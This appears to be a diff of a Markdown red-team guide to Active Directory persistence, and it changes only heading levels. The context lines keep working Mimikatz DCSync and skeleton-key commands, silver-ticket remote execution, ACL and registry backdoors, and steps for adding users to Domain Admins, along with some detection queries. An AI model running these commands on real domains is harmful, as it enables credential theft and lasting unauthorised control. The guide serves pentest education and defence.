@@ -6,7 +6,7 @@ There is much more in Active Directory than just a Domain Admin. Once we have do
 
 These are some techniques to make a persistence on a domain.
 
-# Golden Ticket
+## Golden Ticket
 
 A golden ticket is signed and encrypted by the hash of `krbtgt` account which makes it a valid TGT ticket. Since user account **validation is not done** by the KDC until **TGT** is **older than 20 minutes**. So we can use even deleted/revoked accounts.
 
@@ -93,7 +93,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\Administrator"'
 ```
 > **Note** DCSync attack can be done on any machine even if it is not part of the domain.
 
-## Mitigation
+### Mitigation
 
 While creating a golden ticket the attacker creates some events in logs:
 
@@ -112,7 +112,7 @@ Other trick that defenders do is alert on `4769` for sensitive users such as def
 
 [https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket](https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket)
 
-# Silver Ticket
+## Silver Ticket
 
 A Silver Ticket is a valid **TGS** which is encrypted and signed by the NTLM hash of the service account like the Machine account hash (DC01$). The TGS will allow access only to the service requested.
 
@@ -178,7 +178,7 @@ This table shows the available services:
 
 There are many ways of achieve command executing using Silver Ticket.
 
-## Schedule and Execute a task
+### Schedule and Execute a task
 
 We just need to create a ticket for the `HOST` SPN which will allow us to schedule a task on the target. And then schedule and execute a task.
 
@@ -189,7 +189,7 @@ schtasks /Run /S dc01.corp.local /TN "STCheck"
 ```
 > **Note**: Create a new schtask with different **TN** name for every try.
 
-## Execute WMI queries
+### Execute WMI queries
 
 To execute WMI queries we just need to create a ticket for the `HOST` and `RPCSS`.
 
@@ -211,7 +211,7 @@ Invoke-WmiCommand -ComputerName dc01.corp.local -Credential $cred -ScriptBlock {
 
 * [https://github.com/secabstraction/WmiSploit](https://github.com/secabstraction/WmiSploit)
 
-## PsExec
+### PsExec
 
 To run commands on other machine with `PsExec` we just need to create a ticket for `CIFS` and `HOST` service.
 
@@ -219,7 +219,7 @@ To run commands on other machine with `PsExec` we just need to create a ticket f
 .\PsExec.exe -accepteula \\dc01.corp.local cmd
 ```
 
-## PowerShell Remote
+### PowerShell Remote
 
 With winrm access over a computer you can access it with PowerShell Remote. A ticket with `HOST` and `WSMAN` is needed.
 
@@ -228,7 +228,7 @@ $sess = New-PSSession -ComputerName dc01.corp.local
 Enter-PSSession -Session $sess
 ```
 
-## Dump DC database with DCSync
+### Dump DC database with DCSync
 
 We can dump DC database using DCSync by crafting a silver ticket with the `LDAP` SPN.
 
@@ -236,7 +236,7 @@ We can dump DC database using DCSync by crafting a silver ticket with the `LDAP`
 Invoke-Mimikatz -Command '"lsadump::dcsync /dc:dc01.corp.local /domain:corp.local /user:krbtgt"'
 ```
 
-## Mitigation
+### Mitigation
 
 While creating a silver ticket the attacker creates some events in logs:
 
@@ -249,7 +249,7 @@ Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Forma
 ```
 > **RedTeam Note**: Silver Ticket is very hard to be detected.
 
-# Diamond Ticket
+## Diamond Ticket
 
 A golden ticket is forged completely offline, encrypted with the krbtgt hash, and then passed into a logon session for use. Because DCs don't track if a TGT have been legitimately issued,they will accept TGTs that are encrypted with its own krbtgt hash.
 
@@ -280,7 +280,7 @@ We can check that the TGT has been modified with `describe`:
 .\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=
 ```
 
-# Skeleton Key
+## Skeleton Key
 
 Skeleton Key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password. The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key Malware.
 
@@ -317,7 +317,7 @@ mimikatz# !misc::skeleton
 
 > **The DC can not be patched twice.**
 
-## Mitigation
+### Mitigation
 
 We can detect the Skeleton Key attack looking the events in logs.
 
@@ -346,7 +346,7 @@ Verify after a reboot:
 Get-WmiEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}
 ```
 
-# Directory Services Restore Mode (DSRM)
+## Directory Services Restore Mode (DSRM)
 
 There is a local administrator on every domain controlled called "Administrator" whose password is the DSRM password. DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed.
 
@@ -390,7 +390,7 @@ PsExec.exe /accepeula \\dc01.corp.local powershell
 ```
 > **Note**: Is not possible to connect via `PSRemote`, so use `PsExec` instead.
 
-## Mitigation
+### Mitigation
 
 Look the logs:
 
@@ -400,7 +400,7 @@ Look the logs:
 Get-WinEvent -FilterHashtable @{Logname='System';ID=4657} | ?{$_.message -like "*Kernel Mode Driver*"}
 ```
 
-# Custom Security Support Provider (SSP)
+## Custom Security Support Provider (SSP)
 
 A security support provider is a dll which provides ways for an application to obtain an authenticated connection. Some SSP packages by microsoft are NTLM, kerberos, CredSSP...
 
@@ -425,7 +425,7 @@ Invoke-Mimikatz -Command '"misc::memssp"'
 
 All local logons on the domain controller are logged to `C:\Windows\system32\kiwissp.log`.
 
-## Mitigation
+### Mitigation
 
 Look the logs:
 
@@ -435,7 +435,7 @@ Look the logs:
 Get-WinEvent -FilterHashtable @{Logname='System';ID=4657} | ?{$_.message -like "*Kernel Mode Driver*"}
 ```
 
-# AdminSDHolder
+## AdminSDHolder
 
 Resides in the system container of a domain and used to control the permissions using an ACL for certain built-in privileged groups which are called the `protected groups`.
 
@@ -509,9 +509,9 @@ Get-ObjectACL -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityRefer
 
 Finally we just need to abuse it.
 
-# ACL for Persistence
+## ACL for Persistence
 
-## Abusing FullControl ACL
+### Abusing FullControl ACL
 
 * PowerView:
 ```powershell
@@ -523,7 +523,7 @@ Add-NetGroupUser -UserName user2 -GroupName "Domain Admins" -Domain corp.local
 Add-ADGroupMember -Identity 'Domain Admins' -Members user2 -Verbose
 ```
 
-## Abusing ResetPassword ACL
+### Abusing ResetPassword ACL
 
 * PowerView:
 ```powershell
@@ -533,9 +533,9 @@ Set-DomainUserPassword -Identity user2 -AccountPassword (ConvertTo-SecureString 
 ```powershell
 Set-ADACcountPassword -Identity user2 -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Verbose
 ```
-# ACLs Rights Abuse
+## ACLs Rights Abuse
 
-## Abusing FullControl ACL in domain root
+### Abusing FullControl ACL in domain root
 
 There are even more intereting ACLs which can be abused. With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl.
  
@@ -552,7 +552,7 @@ Add-ObjectAcl -TargetDistinguishedName 'DC=corp,DC=local' -PrincipalSamAccountNa
 Set-ADACL -DistinguishedName 'DC=corp,DC=local' -Principal user1 -Verbose
 ```
 
-## DCSync Backdoor
+### DCSync Backdoor
 
 There are even more intereting ACLs which can be abused. With DA privileges, the ACL for the domain root can be modified to provide useful rights like the ability to run `DCSync`.
 
@@ -582,7 +582,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\Administrator"'
 ```
 So once we have obtained the hash NTLM of *any user* of the domain, `PassTheHash` or `Over-PassTheHash` attack can be executed.
 
-# ACL Security Descriptors
+## ACL Security Descriptors
 
 It is possible to modify Security Descriptors such as security information like owner, primary group, DACL and SACL of multiple remote access methods to allow access to non-admin users.
 
@@ -598,7 +598,7 @@ ACE for built-in administrators for WMI namespaces
 A;CI;CCDCLCSWRPWPRCWD;;;<SID>
 ```
 
-## WMI
+### WMI
 
 ACLs can be modified to allow non-admin users access to securable objects with `Set-RemoteWMI.ps1`:
 
@@ -616,7 +616,7 @@ And to remove permissions:
 Set-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -namespace 'root\cimv2' -Remove -Verbose
 ```
 
-## PowerShell Remoting
+### PowerShell Remoting
 
 Something similar we can do it with PowerShell Remoting with the script `Set-RemotePSRemoting.ps1`.
 
@@ -628,7 +628,7 @@ Set-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Verbose
 Set-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Remove
 ```
 
-## Remote Registry Backdoor
+### Remote Registry Backdoor
 
 Using DAMP we can modify the registry with administrative privileges.
 
@@ -660,7 +660,7 @@ Import-Module .\DAMP-master\Get-RemoteCachedCredentials
 Get-RemoteCachedCredentials -ComputerName dc01.corp.local -Verbose
 ```
 
-# Forged Certificates
+## Forged Certificates
 
 Sometimes AD CS roles are installed on separate servers and not on the DC themselves. And often, they are no treated with the same sensitivity as DCs.
 
